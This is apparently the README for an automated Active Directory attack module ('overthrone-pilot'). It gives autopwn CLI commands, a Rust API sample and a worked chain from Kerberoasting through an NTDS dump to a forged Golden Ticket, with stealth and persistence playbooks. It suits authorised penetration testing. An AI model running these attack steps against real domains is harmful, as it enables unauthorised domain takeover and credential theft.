# Pilot Module

The autopilot. Because sometimes you want to point and click "pwn domain."

## Purpose

The `overthrone-pilot` crate is the autonomous attack planning and execution engine. It combines enumeration, attack graph analysis, and execution into a single "go" button.

## Usage

### CLI

```bash
# Full autopwn
ovt auto -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'

# Target specific goal
ovt auto -d dc01 -D corp.local -u jsmith -p 'Pass' --target "Enterprise Admins"

# Stealth mode
ovt auto -d dc01 -D corp.local -u jsmith -p 'Pass' --stealth

# Dry run (plan only)
ovt auto -d dc01 -D corp.local -u jsmith -p 'Pass' --dry-run
```

### Library

```rust
use overthrone_pilot::planner::Planner;
use overthrone_pilot::goals::{AttackGoal, EngagementState};
use overthrone_pilot::executor::execute_step;

// Create planner
let planner = Planner::new(stealth_mode);

// Define goal
let goal = AttackGoal::DomainAdmin {
    target_group: "Domain Admins".to_string(),
};

// Build initial state
let mut state = EngagementState::default();
state.dc_ip = Some("10.10.10.1".to_string());

// Plan
let plan = planner.plan(&goal, &state, &failed_actions);

// Execute each step
for step in &plan.steps {
    let result = execute_step(step, &ctx, &mut state).await?;
    if result.success {
        state.update_from_result(&result);
    }
}
```

## Modules

### planner

Attack path planning.

**What it does:**
- Analyzes current engagement state
- Identifies viable attack paths
- Prioritizes by cost/noise ratio
- Generates step-by-step plan

**Inputs:**
- Goal (Domain Admin, NTDS dump, recon)
- Current state (credentials, compromised hosts)
- Failed actions (to avoid retrying)

**Output:**
- Ordered list of `PlanStep`
- Estimated noise level
- Confidence score

### executor

Step execution engine.

**What it does:**
- Executes individual attack steps
- Handles retries and failures
- Updates engagement state
- Tracks credentials and hosts

**Step types:**
- `EnumUsers`, `EnumComputers`, etc.
- `Kerberoast`
- `AsrepRoast`
- `ExecCommand`
- `DumpNtds`
- `ForgeTicket`

### goals

Goal definitions and state management.

**Attack Goals:**
```rust
pub enum AttackGoal {
    DomainAdmin { target_group: String },
    DumpNtds { target_dc: Option<String> },
    ReconOnly,
    SpecificUser { target: String },
    Persist,
}
```

**Engagement State:**
```rust
pub struct EngagementState {
    pub dc_ip: Option<String>,
    pub credentials: HashMap<String, Credential>,
    pub admin_hosts: Vec<String>,
    pub has_domain_admin: bool,
    pub failed_actions: Vec<String>,
    // ...
}
```

### playbook

Attack playbooks.

**Built-in playbooks:**
- `quick_win` - Fastest path to DA
- `stealth` - Lower noise, slower
- `comprehensive` - Full enumeration first
- `persistence` - Focus on long-term access

### adaptive

Adaptive planning.

**What it does:**
- Monitors execution results
- Adjusts plan based on findings
- Re-plans when paths fail
- Discovers new opportunities mid-execution

**Triggers for replanning:**
- New credentials found
- New admin access gained
- Step failure
- New attack surface discovered

### wizard

Interactive wizard mode.

**Flow:**
1. Target selection
2. Credential entry
3. Goal selection
4. Method preference
5. Confirmation
6. Execution

## Planning Algorithm

1. **Enumerate** - Gather current information
2. **Build Graph** - Create attack graph from enumeration
3. **Find Paths** - Use pathfinder to identify routes to goal
4. **Prioritize** - Order by cost (effort) and noise
5. **Generate Steps** - Convert paths to executable steps
6. **Execute** - Run steps, update state
7. **Replan** - If state changed, go to step 3

## Noise Levels

| Level | Description |
|-------|-------------|
| `Silent` | No network traffic, passive only |
| `Low` | Normal user activity level |
| `Medium` | Slightly elevated (single exploitation attempts) |
| `High` | Loud (brute force, mass enumeration, DCSync) |
| `Aggressive` | Noisy (service creation, file drops) |

## Example Execution Flow

```
Goal: Domain Admin
Starting: jsmith (Domain User)

Step 1: Enumerate domain users [Low noise]
Step 2: Find Kerberoastable accounts [Low noise]
  → Found: svc_backup with old password
Step 3: Kerberoast svc_backup [Low noise]
  → Obtained hash
Step 4: Crack hash (offline)
  → Password: Backup2019!
Step 5: Check svc_backup group memberships [Low noise]
  → Member of: Backup Operators, Local Admin on DC01
Step 6: Login to DC01 [Medium noise]
Step 7: Dump NTDS [High noise]
  → Obtained: KRBTGT hash
Step 8: Forge Golden Ticket [Silent]

Result: Domain Admin achieved
```

## Configuration

```toml
[pilot]
max_retries = 3
default_timeout = 60
stealth = false
auto_cleanup = true
```

## Safety Features

- **Dry run mode** - Plan without executing
- **Confirmation prompts** - Before high-noise actions
- **Automatic cleanup** - Remove artifacts
- **Rollback** - Attempt to undo failed steps